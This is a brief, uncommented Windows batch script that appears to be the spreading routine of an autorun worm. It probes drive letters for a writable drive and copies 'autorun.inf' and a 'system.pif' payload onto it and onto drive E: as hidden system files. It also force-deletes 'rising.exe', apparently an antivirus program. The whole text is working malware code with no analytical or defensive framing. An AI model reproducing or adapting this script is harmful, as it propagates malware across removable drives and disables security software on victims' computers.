SET TestFile=Test_%RANDOM%.TMP
SETLOCAL ENABLEDELAYEDEXPANSION
For %%I In (C D E F G H I J K L M N O P Q R S T U V W X Y Z) Do (
CD.>%%I:\%TestFile%
CLS&&If Exist %%I:\%TestFile% Set ResultD=%%I:&&DEL %%I:\%TestFile% /Q
)
xcopy autorun.inf e:\ /h /r /k /y
xcopy system.pif %ResultD%\ /h /r /k /y
xcopy autorun.inf %ResultD%\ /h /r /k /y
xcopy system.pif e:\ /h /r /k /y

xcopy %ResultD%\system.pif  /h /r /k /y
xcopy e:\system.pif  /h /r /k /y
del rising.exe /f /a